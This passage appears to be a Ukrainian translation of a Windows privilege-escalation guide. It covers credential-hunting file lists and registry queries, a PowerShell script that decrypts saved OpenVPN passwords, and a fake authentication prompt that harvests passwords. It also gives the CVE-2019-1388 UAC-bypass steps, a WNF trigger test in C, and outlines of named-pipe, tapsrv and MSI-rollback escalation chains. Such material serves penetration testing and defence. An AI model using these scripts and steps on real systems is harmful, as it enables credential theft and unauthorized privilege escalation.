Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви в кореневому каталозі вебсайту IIS

Старий ZIP-архів резервної копії, розміщений безпосередньо в кореневому каталозі вебсайту, може містити попередні файли конфігурації та облікові дані, які можна повторно використати. Перевірте налаштований фізичний шлях сайту й те, чи архів справді доступний через HTTP, перш ніж вважати це витоком. Шлях за замовчуванням `C:\inetpub\wwwroot` — лише можливий варіант. Швидка локальна інвентаризація може вивести назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не доводить, що він містить секрет, або що отримані облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Попросіть облікові дані

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що прямо **просити** клієнта надати **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які колись містили **паролі** у **відкритому тексті** або **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Варіант списку імен файлів без розширення Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Вважайте файл із відповідною назвою кандидатом на зашифроване сховище; його наявність не означає, що ви можете його прочитати, розблокувати або використати збережені облікові дані. Під час перевірки місць зберігання таких файлів перегляньте доступні профілі користувачів і налаштовані кореневі каталоги спільного доступу до файлів.

Файл KeePass `.kdbx`, який можна прочитати, також є лише зашифрованим сховищем, що потребує перевірки. Щоб його розблокувати, потрібен справжній майстер-пароль і будь-які налаштовані фактори, як-от ключовий файл або обліковий запис. Якщо під час авторизованої перевірки в записі виявлено пару хешів LM:NT, перевірте вказаний обліковий запис і те, чи є хеш NT актуальним і чи приймає його цільова служба NTLM, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash). Запис у сховищі сам по собі не надає прав Administrator або SYSTEM; також мають бути наявні віддалений доступ до служби, права облікового запису та окремий крок виконання через службу, якщо він потрібен. В інвентаризації слід зазначати шлях до сховища й можливість його читання, а не виводити базу даних або збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Варіант команди пошуку без розширення Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в RecycleBin

Також перевірте Корзину на наявність облікових даних

Перевірте доступні записи в Recycle Bin на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути багатомісячної давності й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте метадані та наявність у поточної ідентичності дозволу на читання. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваних резервних копій немає. Вважайте назву архіву приводом для перевірки, а не доказом того, що він містить дійсний секрет.

Доступний видалений файл `.pfx` також може стати зачіпкою для **підписування коду**. Якщо він містить доступний приватний ключ, цим ключем можна підписати змінений сценарій PowerShell; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання від імені іншого облікового запису поточна ідентичність має мати змогу змінити саме цей сценарій, чинне правило має дозволяти отриманий підпис для сценарію та цільового облікового запису, а завдання планувальника чи інший компонент із вищими привілеями має фактично запускати його. Сама назва файлу `.pfx`, тема сертифіката чи доступність сценарію для запису не доводять наявності такого ланцюжка. Перш ніж відкривати матеріали приватного ключа або запускати завдання, перевірте метадані, ACL, політику та команду, яку воно виконує.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки та отримані файли на наявність зачіпок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді — в іменованому архіві резервної копії. Такі матеріали можуть надати доступ до окремого зашифрованого тому з даними, що містить старіші резервні копії; перевіряйте том і архів лише за наявності дозволу на доступ. Якщо резервна копія містить `NTDS.dit`, для автономного відновлення доменних облікових даних також потрібен відповідний кущ `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Самі лише назви файлів і заблокований том не доводять, що існує придатний ключ відновлення чи резервна копія домену.

Щоб **відновити паролі**, збережені в кількох програмах, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі ключі реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Витягування ключів OpenSSH із реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних, у яких зберігаються паролі з **Chrome або Firefox**.\
Перевірте бази даних, у яких зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та вибране у браузерах — можливо, там зберігаються **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft документує розташування профілю за замовчуванням](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити його. Наявність файлів — лише привід перевірити сховище облікових даних: переконайтеся, що файли можна прочитати, що доступний контекст DPAPI відповідного користувача або інший дозволений матеріал ключів, а також що збережений логін належить обліковому запису з вищими привілеями. Перерахування лише шляхів не потребує відкривання бази даних чи виведення розшифрованих паролів.

Для Firefox [Mozilla зазначає](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це відповідно файли ключів і зашифрованих логінів, які використовуються разом. Їхня наявність — лише привід для перевірки: з'ясуйте, чи можна прочитати обидва файли, чи є збережені записи та чи захищений ключ Primary Password, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та [права групи на читання або розшифрування паролів LAPS](../active-directory-methodology/laps.md); самі лише артефакти браузера не свідчать про наявність шляху до прав адміністратора.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а його функціональність надається через один або кілька інтерфейсів, що ідентифікуються за допомогою ідентифікаторів інтерфейсів (IID).

Класи та інтерфейси COM визначені в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей розділ реєстру створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього розділу реєстру можна знайти дочірній розділ **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення **ThreadingModel**, яке може мати значення **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (однопотокова або багатопотокова модель) або **Neutral** (модель, незалежна від потоків).

![Історія браузерів — COM DLL Overwriting: у CLSID цього розділу реєстру можна знайти дочірній розділ InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Отже, якщо ви можете **перезаписати будь-які DLL**, які будуть виконані, то зможете **підвищити привілеї**, якщо цю DLL запустить інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення в системі, дивіться:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук вмісту файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу за певною назвою**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**. Я створив цей плагін, щоб **автоматично запускати кожен POST-модуль metasploit, який шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли з паролями, згаданими на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для отримання паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** для різних інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Витік дескрипторів

Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) із **повним доступом**. Цей самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але з успадкуванням усіх відкритих дескрипторів основного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор створеного привілейованого процесу**, отриманий через `OpenProcess()`, і **впровадити shellcode**.\
[Ознайомтеся з цим прикладом, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Ознайомтеся з [**іншою публікацією**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), де докладніше пояснено, як перевіряти та використовувати інші відкриті дескриптори процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Імперсонація клієнта Named Pipe

Сегменти спільної пам’яті, які називають **каналами**, забезпечують зв’язок і передавання даних між процесами.

Windows має функцію **Named Pipes**, що дає змогу процесам, не пов’язаним між собою, обмінюватися даними, зокрема через різні мережі. Це нагадує клієнт-серверну архітектуру, де ролі визначено як **сервер іменованого каналу** та **клієнт іменованого каналу**.

Коли **клієнт** надсилає дані через канал, **сервер**, який його створив, може **перейняти ідентичність** **клієнта**, якщо має необхідні права **SeImpersonate**. Якщо виявити **привілейований процес**, який взаємодіє через канал, що його можна імітувати, з’являється можливість **підвищити привілеї**, перейнявши ідентичність цього процесу, коли він взаємодіятиме зі створеним вами каналом. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений інструмент дає змогу **перехоплювати обмін даними через іменований канал за допомогою такого інструмента, як Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept), **а цей інструмент дає змогу переглядати всі канали, щоб знаходити privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv до RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати асинхронним шляхом подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **4-байтовий запис** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`. Після цього можна отримати права адміністратора Telephony і завантажити довільну DLL як служба. Повний ланцюжок:

- Викликати `ClientAttach`, задавши для `pszDomainUser` шлях до наявного файла, доступного для запису → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для асинхронного запису подій.
- Кожна подія записує контрольований зловмисником `InitContext` із `Initialize` у цей дескриптор. Зареєструвати лінійну програму через `LRegisterRequestRecipient` (`Req_Func 61`), викликати `TRequestMakeCall` (`Req_Func 121`), отримати дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасувати реєстрацію та завершити роботу, щоб повторювати детерміновані записи.
- Додати себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, підключитися знову, а потім викликати `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть виконувати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через засоби відображення Markdown

Клікабельні посилання Markdown, передані до `ShellExecuteExW`, можуть запускати небезпечні обробники URI (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) та виконувати контрольовані зловмисником файли від імені поточного користувача. Див.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Після отримання shell від імені користувача можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів, порівнює поточний стан із попереднім і виводить відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від непривілейованого користувача до NT\AUTHORITY SYSTEM (CVE-2019-1388) / обхід UAC

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи непривілейований обліковий запис.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, не потрібно нічого встановлювати, а бінарний файл, який використовується під час цього процесу, підписаний і виданий Microsoft.

До уражених систем належать:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб використати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

У вас є всі необхідні файли та відомості в цьому репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від рівня цілісності Medium до High / обхід UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та обходи UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions каталогів завантаження в корінь, доступний через вебсервер

Застосунок може створювати передбачуваний підкаталог для завантаження, записувати в нього ім'я файлу, надане користувачем, а потім обробляти файл. Якщо користувач із низькими привілеями може видалити цей підкаталог і замінити його на NTFS junction до запису з боку сервера, запис може пройти через junction до каталогу, доступного через вебсервер. Розміщений там скрипт може виконуватися з правами облікового запису служби вебсервера, якщо сервер виконує файли цього типу. Це специфічна для застосунку межа довільного запису; самі по собі каталог завантаження з правом запису або наявний junction цього не доводять.

Перевірте точне формування шляху та час його використання в обробнику завантажень, фактичні права користувача на видалення та створення підкаталогу, ефективні ACL цільового каталогу, чи переходить процес запису за reparse points, а також чи виконує вебсервер файли в цьому каталозі. Окремо підтвердьте ідентичності процесів запису та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse points, але не може встановити поведінку обробника або майбутню підміну junction. Якщо виконання відбувається в контексті облікового запису служби, перш ніж розглядати окремий шлях через привілеї токена, перевірте **фактичний токен процесу**.

## Очищення привілейованого запланованого завдання, ініційоване WNF

Навіть якщо заплановане завдання заборонено запускати вручну, воно все одно може мати тригер, доступний користувачу без привілеїв. Під час аудиту привілейованого завдання експортуйте його XML і перевірте **всі** тригери, а також DACL завдання, principal і дію. Зокрема, `WnfStateChangeTrigger` вказує на стан Windows Notification Facility (WNF); якщо цей стан, що підтримує керування доступом, дозволяє поточному користувачу публікувати оновлення, користувач може опосередковано запустити завдання з налаштованою для нього ідентичністю, попри `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Наприклад, завдання Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` запускалося від імені SYSTEM, приймало оновлення стану WNF `7508BCA32C079E41` від звичайного користувача, а потім перевіряло `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, навіть коли Recall було вимкнено.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Щоб перевірити доступність, знайдіть `ZwUpdateWnfStateData` у `ntdll.dll`, надішліть порожнє оновлення для восьмибайтової назви стану та зіставте статус повернення з даними про останній запуск завдання або активністю Procmon. У наведеному нижче скороченому тестовому коді використано послідовність байтів із прикладу завдання Recall; замініть її на байти, експортовані для завдання, яке перевіряється.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Перетворення рекурсивного очищення на привілейоване видалення

Корисним примітивом є не лише тригер, а й привілейована процедура очищення, яка приймає контрольований зловмисником каталог. Відстежте операцію від переліку елементів до останньої зміни: пошук профілів/сеансів, дочірні елементи, вибрані за допомогою wildcard, `SHCreateItemFromParsingName` і `IFileOperation::DeleteItem` — вагомі ознаки того, що раніше перевірений шлях згодом буде рекурсивно оброблено. Якщо дочірні елементи не відкриваються відносно довірених дескрипторів каталогів і не перевіряються перед видаленням, зловмисник може змінити розв’язання шляху між переліком елементів і використанням.<sup>[[43]](#references)</sup>

Поєднайте тригер WNF із описаною нижче [підміною oplock, junction і символічного посилання Object Manager](#from-folder-contents-delete-to-system-eop): oplock призупиняє процес очищення після вибору легітимного дочірнього елемента, а потім доступний для запису батьківський каталог підмінюється, тож після відновлення роботи привілейоване видалення проходить через `\RPC Control` до захищеної цілі. У ланцюжку Recall це дало змогу видалити від імені SYSTEM `C:\Config.Msi`, що було потрібно для задокументованої техніки відкату MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Вкладені дочірні елементи обходять поверхневі виправлення для reparse point

Перевірка лише контрольованого зловмисником кореневого каталогу та його безпосереднього дочірнього елемента не захищає від рекурсивного видалення на основі шляху. Залиште ці перевірені об’єкти легітимними, а підміну junction/oplock перенесіть до додаткового дочірнього елемента всередині них: `IFileOperation::DeleteItem` зрештою дістанеться неперевіреного нащадка й перейде за його новою ціллю. CVE-2026-20941 виникла саме через таке неповне виправлення: перший патч Recall перевіряв `UKP` і каталог із назвою у форматі GUID, але залишав стару операцію рекурсивного видалення.<sup>[[43]](#references)</sup>

Безпечний підхід — відкрити **кожен дочірній елемент** відносно вже довіреного дескриптора каталогу, отримати й перевірити остаточний розв’язаний шлях/об’єкт, а тоді застосувати прапорець видалення до цього перевіреного дескриптора. Не перевіряйте лише префікс шляху, а потім не повертайтеся до рекурсивного видалення на основі шляху. Під час перевірки патча також аналізуйте структури безпосередньо в місці виклику: у цьому випадку перевірка під час виконання `OBJECT_ATTRIBUTES` у `NtCreateFile` показала ненульовий `RootDirectory` і відносне ім’я `{GUID}\\secure_file.lock`, спростувавши оманливий результат декомпілятора, який натякав на наявність другого примітива `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Від видалення/переміщення/перейменування довільної папки до SYSTEM EoP

Техніка описана [**в цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а код експлойта [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Суть атаки — зловживання функцією відкату Windows Installer, щоб під час видалення замінити легітимні файли шкідливими. Для цього зловмиснику потрібно створити **шкідливий інсталятор MSI**, який використає для захоплення папки `C:\Config.Msi`. Пізніше Windows Installer використовуватиме цю папку для зберігання файлів відкату під час видалення інших пакетів MSI; ці файли відкату буде змінено так, щоб вони містили шкідливе навантаження.

### Ін’єкція шляху очищення COM Windows Installer (CVE-2025-27727)

Клієнт із низькими привілеями може звернутися до служби `msiexec.exe`, що працює з правами SYSTEM, через COM-об’єкт `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Зворотний інжиніринг визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зміщенням `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зміщенням `0xC8` і `CleanupTempPackages` зі зміщенням `0x50`. Ці назви та зміщення визначено зворотним інжинірингом, і вони можуть відрізнятися між збірками.<sup>[[41]](#references)</sup>

Для користувача без прав адміністратора `SetEEUIDirectoryAndFilter` імперсоніфікує клієнта лише на час відкриття переданого шляху з правом `DELETE` і прапорцями `FILE_FLAG_BACKUP_SEMANTICS` та `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що клієнт може видалити каталог, і запобігає переходу за reparse point, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що цей об’єкт створив Windows Installer.<sup>[[41]](#references)</sup>

